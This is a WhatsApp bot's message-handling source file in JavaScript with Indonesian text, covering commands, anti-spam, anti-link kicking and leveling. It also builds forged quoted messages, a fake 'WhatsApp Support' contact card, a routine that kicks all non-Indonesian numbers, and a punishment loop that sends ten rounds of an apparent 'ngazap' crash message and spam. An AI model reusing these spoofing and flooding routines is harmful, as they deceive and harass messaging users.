'use strict'
const { 
    WAMessageStubType,
    WA_DEFAULT_EPHEMERAL,
    generateWAMessageFromContent,
    downloadContentFromMessage,
    downloadHistory,
    proto,
    getMessage,
    generateWAMessageContent,
    prepareWAMessageMedia,
    generateWAMessage,
    areJidsSameUser,
    downloadMediaMessage,
    makeInMemoryStore,
} = require('@adiwajshing/baileys')
//================================================================================\\
const antilink = JSON.parse(fs.readFileSync('./database/antilink.json'))
const antilinkgc = JSON.parse(fs.readFileSync('./database/antilinkgc.json'))
const antivirtex = JSON.parse(fs.readFileSync('./database/antivirtex.json'))
const antihidetag = JSON.parse(fs.readFileSync('./database/antihidetag.json'))
const antiasing = JSON.parse(fs.readFileSync('./database/antiasing.json'))
const banchat = JSON.parse(fs.readFileSync('./database/banchat.json'))
const owner = JSON.parse(fs.readFileSync('./database/owner.json'))
const sewa = JSON.parse(fs.readFileSync('./database/sewa.json'))
const premium = JSON.parse(fs.readFileSync('./database/premium.json'))
const AntiSpam = JSON.parse(fs.readFileSync('./database/antispam.json'))
const listcmdblock = JSON.parse(fs.readFileSync('./database/blockcmd.json'))
const ban = JSON.parse(fs.readFileSync('./database/banned.json'))
const listerror = JSON.parse(fs.readFileSync('./database/listerror.json'))
const setiker = JSON.parse(fs.readFileSync('./database/stick.json'))
const audionye = JSON.parse(fs.readFileSync('./database/vn.json'))
const user = JSON.parse(fs.readFileSync('./database/user.json'))
const hitnya = JSON.parse(fs.readFileSync('./database/hitToday.json'))
const dash = JSON.parse(fs.readFileSync('./database/dashboard.json'))
const anonChat = JSON.parse(fs.readFileSync('./database/anonymous.json'))
const allcommand = JSON.parse(fs.readFileSync('./database/allcommand.json'))
const spammer = []
//================================================================================\\
module.exports = async (Araa, m, chatUpdate, store) => {
try {
const Ownerin = `${devoloper1}@s.whatsapp.net` || `${nomerOwner}@s.whatsapp.net`
const ownerNumber = [`${nomerOwner}@s.whatsapp.net`,`${devoloper1}@s.whatsapp.net`,`${devoloper2}@s.whatsapp.net`,`${devoloper3}@s.whatsapp.net`,`${devoloper4}@s.whatsapp.net`,`${devoloper5}@s.whatsapp.net`,`${devoloper6}@s.whatsapp.net`]    
const { type, now, fromMe } = m
const Id = m.key.id
const antibot = m.isBaileys
const content = JSON.stringify(m.message)
const from = m.key.remoteJid
const time = moment.tz('Asia/Jakarta').format('DD/MM HH:mm:ss')
const body = type === 'conversation'? m.message.conversation: type == 'imageMessage'? m.message.imageMessage.caption: type == 'videoMessage'? m.message.videoMessage.caption: type == 'extendedTextMessage'? m.message.extendedTextMessage.text: type == 'buttonsResponseMessage'? m.message.buttonsResponseMessage.selectedButtonId: type == 'listResponseMessage'? m.message.listResponseMessage.singleSelectReply.selectedRowId: type == 'templateButtonReplyMessage'? m.message.templateButtonReplyMessage.selectedId: type === 'messageContextInfo'? m.message.buttonsResponseMessage?.selectedButtonId || m.message.listResponseMessage?.singleSelectReply.selectedRowId: ''
const pes = type === 'conversation' && m.message.conversation? m.message.conversation: type == 'imageMessage' && m.message.imageMessage.caption? m.message.imageMessage.caption: type == 'videoMessage' && m.message.videoMessage.caption? m.message.videoMessage.caption: type == 'extendedTextMessage' && m.message.extendedTextMessage.text? m.message.extendedTextMessage.text: ''
const messagesD = pes.slice(0).trim().split(/ +/).shift().toLowerCase()
const messagesC = pes.slice(0).trim()
if (multi) {
var prefix = /^[°#*+,.?=''():√%!¢£¥€π¤ΠΦ_&`™©®Δ^βα¦|/\\©^]/.test(body) ? body.match(/^[°#*+,.?=''():√%¢£¥€π¤ΠΦ_&!`™©®Δ^βα¦|/\\©^]/gi) : '.'
var thePrefix = 'Multi Prefix'
}
const budy = type === 'conversation' ? m.message.conversation : type === 'extendedTextMessage' ? m.message.extendedTextMessage.text : ''
const selectedButton = type == 'buttonsResponseMessage' ? m.message.buttonsResponseMessage.selectedButtonId : ''
const responseButton = type == 'listResponseMessage' ? m.message.listResponseMessage.title : ''
const args = body.trim().split(/ +/).slice(1)
const isCmd = body.startsWith(prefix)
const q = args.join(' ')
const c = args.join(' ')
const timeWib = moment().tz('Asia/Jakarta').format('HH:mm:ss')
const timeWit = moment().tz('Asia/Makassar').format('HH:mm:ss')
const timeWita = moment().tz('Asia/Jayapura').format('HH:mm:ss')
const botNumber = Araa.user.id ? Araa.user.id.split(':')[0] + '@s.whatsapp.net' : Araa.user.id
const isGroup = from.endsWith('@g.us')
const sender = isGroup ? (m.key.participant ? m.key.participant : m.participant) : m.key.remoteJid
const senderNumber = sender.split('@')[0]
const isOwner = ownerNumber.includes(sender) || owner.includes(sender)
const command = body.replace(prefix, '').trim().split(/ +/).shift().toLowerCase()
const theOwner = sender == Ownerin
const totalchat = await store.chats.all().map((v) => v.id)
const allchat = await store.chats.all().filter((v) => v.id.endsWith('.net')).map((v) => v.id)
const totalGroup = totalchat.filter((v) => v.endsWith('g.us'))
const groupMetadata = isGroup ? await Araa.groupMetadata(from) : ''
const groupName = isGroup ? groupMetadata.subject : ''
const groupId = isGroup ? groupMetadata.jid : ''
const groupMembers = isGroup ? groupMetadata.participants : ''
const participants = isGroup ? await groupMetadata.participants : ''
const groupDesc = isGroup ? groupMetadata.desc : ''
const groupOwner = isGroup ? groupMetadata.owner : ''
const groupAdmins = isGroup ? await getGroupAdmins(participants) : ''
const pushname = m.pushName || 'No Name'
const forward = { forwardingScore: 10, isForwarded: true, sendEphemeral: true }
const text = args.join(' ')
const timestampp = speed()
const latensi = speed() - timestampp
const arg = budy.slice(command.length + 2, budy.length)
const itsMe = m.key.fromMe
const mentionByTag = type == 'extendedTextMessage' && m.message.extendedTextMessage.contextInfo != null ? m.message.extendedTextMessage.contextInfo.mentionedJid : []
const mentionByReply = type == 'extendedTextMessage' && m.message.extendedTextMessage.contextInfo != null ? m.message.extendedTextMessage.contextInfo.participant || '' : ''
const quoted = m.quoted ? m.quoted : m
const mime = (quoted.msg || quoted).mimetype || ''
const users = mentionByReply ? mentionByReply : mentionByTag[0]
const mention = typeof mentionByTag == 'string' ? [mentionByTag] : mentionByTag
mention != undefined ? mention.push(mentionByReply) : []
const mentionUser = mention != undefined ? mention.filter((n) => n) : []
const isHit = checkHit(senderNumber)
const more = String.fromCharCode(8206)
const readmore = more.repeat(4001)
const numberQuery = q.replace(new RegExp('[()+-/ +/]', 'gi'), '') + '@s.whatsapp.net'        
const Input = mentionByTag[0] ? mentionByTag[0] : mentionByReply ? mentionByReply : q ? numberQuery : false
const delay = (time) => new Promise((res) => setTimeout(res, time))
const isLimit = kurangLimit(senderNumber, 1)
//================================================================================\\
const userLevel = getLevelingLevel(senderNumber)
const userExp = getLevelingXp(senderNumber)
const userId = getLevelingId(senderNumber)
const amountExp = Math.floor(Math.random() * 10) + 50
const requiredExp = 1000 * userLevel
const userPersen = (userExp / requiredExp) * 100
const userVerified = getDateId(senderNumber)
//================================================================================\\
const DarahAwal = rpg.darahawal
const isCekDarah = getDarah(senderNumber)
const isUmpan = getUmpan(senderNumber)
const isPotion = getPotion(senderNumber)
const isIkan = getIkan(senderNumber)
const isAyam = getAyam(senderNumber)
const iskelinci = getKelinci(senderNumber)
const isDomba = getDomba(senderNumber)
const isSapi = getSapi(senderNumber)
const isGajah = getGajah(senderNumber)
const isMonay = getMonay(senderNumber)
const isBesi = getBesi(senderNumber)
const isEmas = getEmas(senderNumber)
const isEmerald = getEmerald(senderNumber)
const ikan = ['🐟', '🐠', '🐡']
//================================================================================\\
const isBotGroupAdmins = isGroup ? groupAdmins.includes(botNumber) : false
const isGroupOwner = isGroup ? groupOwner == sender : false
const isGroupAdmins = isGroup ? groupAdmins.includes(sender) : false
const isAntiLink = antilink.includes(from)
const isKickarea = antiasing.includes(from)
const isAntilinkGc = antilinkgc.includes(from)
const isBanchat = banchat.includes(from)
const isAntiVirtex = antivirtex.includes(from)
const isAntihidetag = antihidetag.includes(from)
const isPremium = isOwner ? true : premium.includes(sender) || m.key.fromMe
const isSewa = sewa.includes(from)
const isAfk = cekAfk(from, sender)     
const gcount = isPremium ? gcounti.prem : gcounti.user
const limitCount = isPremium ? null : limitawal
//================================================================================\\
require('../message/mess.js')(senderNumber, prefix, getLimit, cekGLimit, gcount, command)
//================================================================================\\
const iyakak = botz[Math.floor(Math.random() * botz.length)]
const ucapbot = fs.readFileSync(iyakak)
//================================================================================\\
const unreg = unregister[Math.floor(Math.random() * unregister.length)]
const gakada = fs.readFileSync(unreg)
//================================================================================\\
const lusange = sangebro[Math.floor(Math.random() * sangebro.length)]
const sangeya = fs.readFileSync(lusange)
//================================================================================\\
const anying = toxicbro[Math.floor(Math.random() * toxicbro.length)]
const astaga = fs.readFileSync(anying)
//================================================================================\\
const ahenggak = enggakmau[Math.floor(Math.random() * enggakmau.length)]
const gakmau = fs.readFileSync(ahenggak)
//================================================================================\\
const ay = ucappagi[Math.floor(Math.random() * ucappagi.length)]
const oahyo = fs.readFileSync(ay)
//================================================================================\\
const ayuk = ucapmalam[Math.floor(Math.random() * ucapmalam.length)]
const oyasumi = fs.readFileSync(ayuk)
//================================================================================\\
const yayuk = ucapsiang[Math.floor(Math.random() * ucapsiang.length)]
const koniciwa = fs.readFileSync(yayuk)
//================================================================================\\
const alal = spamnih[Math.floor(Math.random() * spamnih.length)]
const nospam = fs.readFileSync(alal)
//================================================================================\\
const ulul = ucaphai[Math.floor(Math.random() * ucaphai.length)]
const moshimos = fs.readFileSync(ulul)
//================================================================================\\
const alul = ucapsalamikum[Math.floor(Math.random() * ucapsalamikum.length)]
const walaikumsalam = fs.readFileSync(alul)
//================================================================================\\
const awlu = loplop[Math.floor(Math.random() * loplop.length)]
const lopyoutoo = fs.readFileSync(awlu)
//================================================================================\\
const textcmd = tekscmd[Math.floor(Math.random() * tekscmd.length)]
const textspam = teksspam[Math.floor(Math.random() * teksspam.length)]
//================================================================================\\        
if (auto == 'recording'){        
await Araa.sendPresenceUpdate('recording', from)
} else if (auto == 'typing'){        
await Araa.sendPresenceUpdate('composing', from)
} else if (auto == 'available'){        
await Araa.sendPresenceUpdate('available', from)
}
//================================================================================\\
try {
var ppimg = await Araa.profilePictureUrl(sender, 'image')
} catch (err) {
console.log(err)
var ppimg = 'https://i0.wp.com/www.gambarunik.id/wp-content/uploads/2019/06/Top-Gambar-Foto-Profil-Kosong-Lucu-Tergokil-.jpg'
}
//================================================================================\\
const ofrply = await getBuffer(ppimg)
const dfrply = await reSize(ppimg, 300, 300)
const zfrply = await reSize(thumb, 300, 300)
//================================================================================\\
if (timeWib < '23:59:00') {
var ucapanWaktu = 'Selamat malam'
}
if (timeWib < '19:00:00') {
var ucapanWaktu = 'Selamat malam'
}
if (timeWib < '18:00:00') {
var ucapanWaktu = 'Selamat sore'
}
if (timeWib < '15:00:00') {
var ucapanWaktu = 'Selamat siang'
}
if (timeWib < '11:00:00') {
var ucapanWaktu = 'Selamat pagi'
}
if (timeWib < '06:00:00') {
var ucapanWaktu = 'Selamat pagi'
}
//================================================================================\\
const ftoko = { key: { fromMe: false, participant: `0@s.whatsapp.net`, ...(from ? { remoteJid: '16505434800@s.whatsapp.net' } : {}) },message: {productMessage: {product: { productImage: { mimetype: 'image/jpeg', jpegThumbnail: ofrply }, title: `${pushname}`, description: `${ucapanWaktu} kak`, currencyCode: 'IDR', priceAmount1000: `${pushname}`, retailerId: `Rp10`, productImageCount: 1 },businessOwnerJid: `0@s.whatsapp.net`,},},}
const fkontak = {key: { fromMe: false, participant: `0@s.whatsapp.net`, ...(from ? { remoteJid: `0@s.whatsapp.net` } : {}) },message: {contactMessage: {displayName: `${pushname}`,vcard: `BEGIN:VCARD\nVERSION:3.0\nN:XL;${pushname},;;;\nFN:${pushname},\nitem1.TEL;waid=${sender.split('@')[0]}:${sender.split('@')[0]}\nitem1.X-ABLabel:Ponsel\nEND:VCARD`,jpegThumbnail: ofrply,},},}
const ftext = { key: { fromMe: false, participant: `0@s.whatsapp.net`, ...(from ? { remoteJid: '16505434800@s.whatsapp.net' } : {}) }, message: { extendedTextMessage: { text: `${botName}`, title: `Hmm`, jpegThumbnail: ofrply } } }
const ftroli = { key: { fromMe: false, participant: `0@s.whatsapp.net`, ...(from ? { remoteJid: '16505434800@s.whatsapp.net' } : {}) },message: { orderMessage: { itemCount: 200, status: 1, surface: 2, message: `${botName}\n${ucapanWaktu} kak`, orderTitle: `${ucapanWaktu} kak`, thumbnail: ofrply, sellerJid: `0@s.whatsapp.net` } },}
const floc = { key: { fromMe: false, participant: `0@s.whatsapp.net`, remoteJid: '6289530863358-1621036495@g.us' }, message: { liveLocationMessage: { title: `${botName}`, jpegThumbnail: ofrply } } }
const fimage = { key: { fromMe: false, participant: `0@s.whatsapp.net`, ...(from ? { remoteJid: 'status@broadcast' } : {}) },message: {imageMessage: {url: 'https://mmg.whatsapp.net/d/f/At0x7ZdIvuicfjlf9oWS6A3AR9XPh0P-hZIVPLsI70nM.enc',mimetype: 'image/jpeg',caption: botName,fileSha256: '+Ia+Dwib70Y1CWRMAP9QLJKjIJt54fKycOfB2OEZbTU=',fileLength: '28777',height: 1080,width: 1079,mediaKey: 'vXmRR7ZUeDWjXy5iQk17TrowBzuwRya0errAFnXxbGc=',fileEncSha256: 'sR9D2RS5JSifw49HeBADguI23fWDz1aZu4faWG/CyRY=',directPath: '/v/t62.7118-24/21427642_840952686474581_572788076332761430_n.enc?oh=3f57c1ba2fcab95f2c0bb475d72720ba&oe=602F3D69',mediaKeyTimestamp: '1610993486',jpegThumbnail: ofrply,scansSidecar: '1W0XhfaAcDwc7xh1R8lca6Qg/1bB4naFCSngM2LKO2NoP5RI7K+zLw==',},},}
const fdoc = { key: { participant: '0@s.whatsapp.net' }, message: { documentMessage: { title: 'Halo bang', jpegThumbnail: ofrply } } }
const fvid = { key: { fromMe: false, participant: `0@s.whatsapp.net`, ...(from ? { remoteJid: '6289643739077-1613049930@g.us' } : {}) },message: { videoMessage: { title: `hallo kak👋 ${pushname}`, h: `Hmm`, seconds: '30', caption: `hallo kak👋 ${pushname}`, jpegThumbnail: ofrply } },}
const fgc = { key: { fromMe: false, participant: '0@s.whatsapp.net', remoteJid: '0@s.whatsapp.net' },message: { groupInviteMessage: { groupJid: '6288213840883-1616169743@g.us', inviteCode: 'mememteeeekkeke', groupName: 'P', caption: '', jpegThumbnail: ofrply } },}
const fgif = { key: { fromMe: false, participant: `0@s.whatsapp.net`, ...(from ? { remoteJid: '6289643739077-1613049930@g.us' } : {}) },message: { videoMessage: { title: `hallo kak👋 ${pushname}`, h: `Hmm`, seconds: '30', gifPlayback: 'true', caption: `hallo kak👋 ${pushname}`, jpegThumbnail: ofrply } },}
const fvn = { key: { fromMe: false, participant: `62882000383955@s.whatsapp.net`, ...(from ? { remoteJid: '6289643739077-1613049930@g.us' } : {}) },message: { audioMessage: { mimetype: 'audio/ogg; codecs=opus', seconds: '30', ptt: 'true' } },}
//================================================================================\\
const bugkontak = {
key: { fromMe: false, participant: `0@s.whatsapp.net`, ...(from ? { remoteJid: '@s.whatsapp.net' } : {}) },
message: {
contactMessage: {
displayName: 'WhatsApp Support',
vcard: 'BEGIN:VCARD\nVERSION:3.0\nN:Support;WhatsApp;;;\nFN:WhatsApp Support\nORG:WhatsApp Support\nTITLE:\nitem1.TEL;waid=6288226703423:+62 882-2670-3423\nitem1.X-ABLabel:Ponsel\nX-WA-BIZ-NAME:WhatsApp Support\nEND:VCARD',
},
},
}
//================================================================================\\
if (Qoted === 'ftoko') {
var setQuoted = ftoko
} else if (Qoted === 'fkontak') {
var setQuoted = fkontak
} else if (Qoted === 'ftext') {
var setQuoted = ftext
} else if (Qoted === 'ftroli') {
var setQuoted = ftroli
} else if (Qoted === 'floc') {
var setQuoted = floc
} else if (Qoted === 'fimage') {
var setQuoted = fimage
} else if (Qoted === 'fdoc') {
var setQuoted = fdoc
} else if (Qoted === 'fvid') {
var setQuoted = fvid
} else if (Qoted === 'fgc') {
var setQuoted = fgc
} else if (Qoted === 'fgif') {
var setQuoted = fgif
} else if (Qoted === 'fvn') {
var setQuoted = fvn
} else if (Qoted === 'm') {
var setQuoted = m
}
//================================================================================\\
const setReply = async (teks) => {
if (autoquoted === true && replyType === 'web1') {
Araa.sendMessage(from, {contextInfo: { externalAdReply: { showAdAttribution: true, title: `hallo kak👋 ${pushname}`, body: 'DONT CLICK HERE', previewType: 'PHOTO', thumbnail: ofrply, sourceUrl: `https://wa.me/${nomerOwner}?text=${textreply}` } },text: teks,}, { quoted: setQuoted })
} else if (autoquoted === false && replyType === 'web1') {
Araa.sendMessageV2(from,{contextInfo: { externalAdReply: { showAdAttribution: true, title: `hallo kak👋 ${pushname}`, body: 'DONT CLICK HERE', previewType: 'PHOTO', thumbnail: ofrply, sourceUrl: `https://wa.me/${nomerOwner}?text=${textreply}` } },text: teks,},{ quoted: setQuoted })
} else if (autoquoted === true && replyType === 'web2') {
Araa.sendMessage(from, { contextInfo: { forwardingScore: 9999, isForwarded: true, showAdAttribution: true, externalAdReply: { title: `hallo kak👋 ${pushname}`, body: 'DONT CLICK HERE', previewType: 'PHOTO', thumbnail: ofrply, sourceUrl: `https://wa.me/${nomerOwner}?text=${textreply}` },}, text: teks, }, { quoted: setQuoted })
} else if (autoquoted === false && replyType === 'web2') {
Araa.sendMessageV2(from, { contextInfo: { forwardingScore: 9999, isForwarded: true, showAdAttribution: true, externalAdReply: { title: `hallo kak👋 ${pushname}`, body: 'DONT CLICK HERE', previewType: 'PHOTO', thumbnail: ofrply, sourceUrl: `https://wa.me/${nomerOwner}?text=${textreply}` },}, text: teks, }, { quoted: setQuoted })
} else if (autoquoted === true && replyType === 'web3') {
Araa.sendMessage(from,{contextInfo: {forwardingScore: 10,isForwarded: true,externalAdReply: { showAdAttribution: true, title: `hallo kak👋 ${pushname}`, body: 'DONT CLICK HERE', previewType: 'PHOTO', thumbnail: ofrply, sourceUrl: `https://wa.me/${nomerOwner}?text=${textreply}` },},text: teks,},{ quoted: setQuoted })
} else if (autoquoted === false && replyType === 'web3') {
Araa.sendMessageV2(from,{contextInfo: {forwardingScore: 10,isForwarded: true,externalAdReply: { showAdAttribution: true, title: `hallo kak👋 ${pushname}`, body: 'DONT CLICK HERE', previewType: 'PHOTO', thumbnail: ofrply, sourceUrl: `https://wa.me/${nomerOwner}?text=${textreply}` },},text: teks,},{ quoted: setQuoted })
} else if (autoquoted === true && replyType === 'mess') {
Araa.sendMessage(from, { text: teks }, { quoted: setQuoted })
} else if (autoquoted === false && replyType === 'mess') {
Araa.sendMessageV2(from, { text: teks })
} else if (replyType === 'troli') {
let template = await generateWAMessageFromContent(
from,{orderMessage: {orderId: '62887435047326@s.whatsapp.net',thumbnail: fs.readFileSync('./media/image/reply.jpg'),itemCount: '2022',title: 'title',description: 'description',status: 1,surface: 1,message: teks,orderTitle: botName }},{quoted: m})
Araa.relayMessage(from, template.message, { messageId: template.key.id })
} else if (replyType == 'troli2') {
let template = await generateWAMessageFromContent(from,{listMessage: {sections: [],title: botName,description: teks,buttonText: '',listType: 2,productListInfo: {productSections: [{products: [{ productId: '9999999999999999' }, { productId: '6431678466857362' }, { productId: '4392524570816732' }],title: 'junior',},],headerImage: {productId: '4120139628109348',jpegThumbnail: thumb,},businessOwnerJid: '62887435047326@s.whatsapp.net'}}},{quoted: m})
Araa.relayMessage(from, template.message, { messageId: template.key.id })
} else {
Araa.sendMessage(from, { text: 'Error SetReply Tidak Di Temukan' })
}
}
//================================================================================\\
const Sendbutdocument = async (id, text1, desc1, gam1, but = [], options = {}) => {
const buttonMessage = {
contextInfo: options,
document: fs.readFileSync('./media/document/file.docx'),
mimetype: 'application/vnd.openxmlformats-officedocument.wordprocessingml.document',
title: 'Footer text',
fileLength: 999999999999,
pageCount: 100,
fileName: botName,
caption: text1,
footer: desc1,
buttons: but,
headerType: 'DOCUMENT',
}
await Araa.sendMessage(id, buttonMessage, options)
}
//================================================================================\\
if (!publik && !itsMe && !isOwner && !theOwner) return
const used = process.memoryUsage()
const cpus = os.cpus().map((cpu) => {
cpu.total = Object.keys(cpu.times).reduce((last, type) => last + cpu.times[type], 0)
return cpu
})
const cpu = cpus.reduce(
(last, cpu, _, { length }) => {
last.total += cpu.total
last.speed += cpu.speed / length
last.times.user += cpu.times.user
last.times.nice += cpu.times.nice
last.times.sys += cpu.times.sys
last.times.idle += cpu.times.idle
last.times.irq += cpu.times.irq
return last
},
{
speed: 0,
total: 0,
times: {
user: 0,
nice: 0,
sys: 0,
idle: 0,
irq: 0,
},
}
)
//================================================================================\\
const sendAllPc = (teks) => {
for (let i of allchat) {
Araa.sendMessage(i, { text: teks })
}
} 
const pickRandom = (arr) => {
return arr[Math.floor(Math.random() * arr.length)]
}
const reply = (teks) => {
Araa.sendMessage(from, { text: teks }, { quoted: m })
}
const mentions = (teks, memberr, id) => {
id == null || id == undefined || id == false ? Araa.sendMessage(from, { text: teks, mentions: memberr, contextInfo: { mentionedJid: memberr } }) : Araa.sendMessage(from, { mentions: memberr, text: teks, contextInfo: { mentionedJid: memberr } }, { quoted: m })}
const sendMess = (hehe, teks) => {
Araa.sendMessage(hehe, { text, teks })
}
const buttonWithText = (from, text, footer, buttons) => {
return Araa.sendMessage(from, { text: text, footer: footer, templateButtons: buttons })
}
const math = (teks) => {
return Math.floor(teks)
}
const sendGif = (teks, teksnya) => {
Araa.sendMessage(from, { video: teks, caption: 'Nih!', gifPlayback: true }, { quoted: m })
}
const sendvn = (teks) => {
Araa.sendMessage(from, { audio: teks, mimetype: 'audio/mp4', ptt: true }, { quoted: setQuoted })
}
const sendSticker = (pesan) => {
Araa.sendMessage(from, { sticker: pesan }, { quoted: setQuoted })
}
const deleteMessage = (pesan) => {
Araa.sendMessage(from, { delete: pesan.key })
}
//================================================================================\\
const onlyOwner = async () => {
if (autovn) {
sendvn(gakmau)
} else if (autoSticker) {
sendSticker(khususowner)
} else {
setReply(mess.only.owner)
}
}
const onlyAdmin = async () => {
if (autovn) {
sendvn(gakmau)
} else if (autoSticker) {
sendSticker(hanyaadmin)
} else {
setReply(mess.only.admin)
}
}
const onlyBadmin = async () => {
if (autoSticker) {
sendSticker(jadiinadmin)
} else {
setReply(mess.only.Badmin)
}
}
const onlyGroup = async () => {
setReply(mess.only.group)
}
const onlyWait = async () => {
if (autoSticker) {
sendSticker(spam1)
} else {
setReply(mess.wait)
}
}
const onlySewa = async () => {
if (autobutton) {
Araa.sendButMessage(from,`Khusus sewa\nJika ingin sewa chat owner`,fake,[{ buttonId: `${prefix}owner`, buttonText: { displayText: '𝖔𝖜𝖓𝖊𝖗' }, type: 1 },{ buttonId: `${prefix}sewa`, buttonText: { displayText: '𝖘𝖊𝖜𝖆' }, type: 1 },],setQuoted)
} else {
setReply('Khusus sewa\nJika ingin sewa chat owner')
}
}
const onlyPrem = async () => {
if (autobutton) {
Araa.sendButMessage(from, `Maaf kakak fitur ini khusus user premium\nSilahkan chat owner untuk buyprem`, fake, [{ buttonId: `${prefix}owner`, buttonText: { displayText: '𝖔𝖜𝖓𝖊𝖗' }, type: 1 }], setQuoted)
} else {
setReply('Maaf kakak fitur ini khusus user premium\nSilahkan chat owner untuk buyprem')
}
}
const onlyLimit = async () => {
if (autobutton) {
Araa.sendButMessage(from, `Limit kamu sudah habis silahkan kirim ${prefix}ceklimit untuk mengecek limit`, fake, [{ buttonId: `${prefix}ceklimit`, buttonText: { displayText: '𝖈𝖊𝖐𝖑𝖎𝖒𝖎𝖙' }, type: 1 }], setQuoted)
} else {
setReply(`Limit kamu sudah habis silahkan kirim ${prefix}ceklimit untuk mengecek limit`)
}
}
//================================================================================\\
const addSpammer = function (jid, _db) {
let position = false
Object.keys(_db).forEach((i) => {
if (_db[i].id === jid) {
position = i
}
})
if (position !== false) {
_db[position].spam += 1
} else {
let bulin = { id: jid, spam: 1 }
_db.push(bulin)
}
}
const FinisHim = async function (jid, _db) {
let position = false
Object.keys(_db).forEach((i) => {
if (_db[i].id === jid) {
position = i
}
})
if (position !== false) {
if (_db[position].spam > 5) {
let Name = await Araa.getName(jid + `@s.whatsapp.net`)
if (cekBannedUser(jid, ban) && !isOwner) {
return
}
addBanned(Name, calender, jid, ban)
console.log(`${jid} Terdeteksi spam lebih dari ${_db[position].spam} kali`)
setReply('Kamu telah di banned karena melakukan spam')
}
} else {
console.log(`Spam ke ${_db[position].spam}`)
}
}

SpamExpired(senderNumber, 'NotCase', AntiSpam)
//================================================================================\\
if (cekBannedUser(senderNumber, ban) && !isOwner) {
return
}
if (cekSpam('Case', senderNumber, AntiSpam)) {
addSpammer(senderNumber, spammer)
FinisHim(senderNumber, spammer)
console.log('antispam Case aktif')
return
}
if (antiSpam && isCmd && msgFilter.isFiltered(from) && !isGroup && !itsMe && !isOwner) {
addSpam('Case', senderNumber, '30s', AntiSpam)
addSpammer(senderNumber, spammer)
return setReply('Ups kamu terdeteksi spam')
}
if (antiSpam && isCmd && msgFilter.isFiltered(from) && isGroup && !itsMe && !isOwner) {
addSpam('Case', senderNumber, '30s', AntiSpam)
addSpammer(senderNumber, spammer)
return setReply('Ups kamu terdeteksi spam')
}
if (isCmd && !isOwner) msgFilter.addFilter(from)
//================================================================================\\
if (isGroup && isAntilinkGc && budy.includes(`chat.whatsapp.com`)) {
if (isGroupAdmins) return setReply('Alah sia admin grup mah bebas yekan :v')
let linkgc = await Araa.groupInviteCode(from)
if (budy.includes(`${linkgc}`)) return setReply('Wuanjir kirain link grup lain, huh hampir aja kena kick 😆')
if (budy.includes('zin admin') || budy.includes('zinmin')) return setReply('Izin Admin diterima')
setReply(` *「 LINK GROUP DETECTED 」*\nKamu mengirimkan link group, maaf kamu di kick dari grup :(`)
setTimeout(() => {
Araa.groupParticipantsUpdate(from, [sender], 'remove').catch((e) => {
setReply(`BOT HARUS JADI ADMIN`)
})
}, 2000)
}
//================================================================================\\
if (isGroup && isAntiLink) {
if (budy.includes(`https:`)) {
if (isGroupAdmins) return setReply('Alah sia admin grup mah bebas yekan :v')
let linkgc = await Araa.groupInviteCode(from)
if (budy.includes(`${linkgc}`)) return reply('Wuanjir kirain link grup lain, huh hampir aja kena kick 😆')
if (budy.includes('zin admin') || budy.includes('zinmin')) return setReply('Izin Admin diterima')
setReply(` *「 LINK DETECTED 」*\nKamu mengirimkan link, maaf kamu di kick dari grup :(`)
setTimeout(() => {
Araa.groupParticipantsUpdate(from, [sender], 'remove').catch((e) => {
setReply(`BOT HARUS JADI ADMIN`)
})
}, 2000)
}
}
//================================================================================\\
if (isGroup && isBotGroupAdmins && isKickarea && !itsMe) {
let member = await groupMembers.map((u) => u.id)
for (let i = 0; i < member.length; i++) {
if (member[i].slice(0, 2) !== '62') {
let usersId = await groupMembers.find((u) => u.id == member[i])
let linkgc = await Araa.groupInviteCode(from)
if (budy.includes(`${linkgc}`) && !usersId.groupAdmins) {
setReply('Wuanjir kirain link grup lain, huh hampir aja kena kick 😆')
} else
await Araa.groupParticipantsUpdate(from, [member[i]], 'remove')
await sleep(1000)
}
}
}
//================================================================================\\
if (isGroup && isAntiVirtex && budy.length > 20000) {
if (isGroupAdmins) return setReply('*VIRTEX DETECTED*')
console.log(color('[KICK]', 'red'), color('Received a virus text!', 'yellow'))
await Araa.sendMessage(from, { text: antivirus(pushname, groupName) })
if (!isBotGroupAdmins) {
return
}
if (isOwner) {
return
}
await Araa.groupParticipantsUpdate(from, [sender], 'remove')
await Araa.sendMessage(`${nomerOwner}@s.whatsapp.net`, { text: `Hai Owner! wa.me/${sender.split('@')[0]} Terdeteksi Telah Mengirim Virtex ${isGroup ? `di Group ${groupName}` : ''}` })
}
//================================================================================\\
if (budy.startsWith(`${prefix}hidetag`) && isAntihidetag) {
if (isGroupAdmins) await Araa.groupParticipantsUpdate(from, [sender], 'demote')
for (let i = 0; i < 10; i++) {
await Araa.sendKatalog(sender, ngazap(prefix), ngazap(prefix), thumb, { quoted: setQuoted })
let a = await Araa.sendMessage(from, { react: { text: '0️', key: { remoteJid: from, fromMe: true, id: m.id } } })
await Araa.sendMessage(sender, { text: 'awowkwkwk' }, { quoted: a })
await Araa.sendMessage(sender, { text: 'awowkwkwk' }, { quoted: lep })
await sleep(1000)
}
}
//================================================================================\\
if (!isHit && isCmd) {
addUserId(gcount, calender, pushname, senderNumber, limitCount)
}
if (isCmd) {
AddHit(senderNumber)
cmdAdd('run', '1d', hitnya)
}
expiredCmd(hitnya, dash)
const thisHit = `${getHit('run', hitnya)}`
//================================================================================\\
if (isHit && !itsMe && isCmd) {
try {
if (userLevel === undefined && userId === undefined) {
addUserId(gcount, calender, pushname, senderNumber, limitCount)
}
if (autoLevel) {
addLevelingXp(senderNumber, amountExp)
}
if ((autoLevel && userExp >= requiredExp) || (autoLevel && userExp == requiredExp)) {
addLevelingLevel(senderNumber, 1, user)
resetLevelingXp(senderNumber, userExp)
let anune = `${userLevel}0000`
let susu = randomNomor(math(anune))
addBalance(senderNumber, susu)
if (userLevel >= 25) {
let anuitu = `${userLevel}`
var sapi = randomNomor(math(anuitu))
tambahLimit(senderNumber, sapi)
} else {
var sapi = '0'
}
let levelnih = userLevel + 1
let teks = `*]───「 LEVEL UP 」───[*

Selamat, kamu telah naik ke level ${levelnih}
Pangkatmu saat ini adalah 「 *${userLeveling(levelnih)}* 」
Dan kamu telah mendapatkan
💳 Saldo  : Rp ${susu}
📉 Limit : ${sapi}`
await setReply(teks)
}
} catch (err) {
console.error(err)
}
}
//================================================================================\\
const isImage = type === 'imageMessage'
const isVideo = type === 'videoMessage'
const isSticker = type == 'stickerMessage'
const isAudio = type == 'audioMessage'
const isProtocol = type == 'protocolMessage'
const isText = type == 'conversation'
const isMedia = type === 'imageMessage' || type === 'videoMessage'        
const isViewOnce = type == 'viewOnceMessage'        
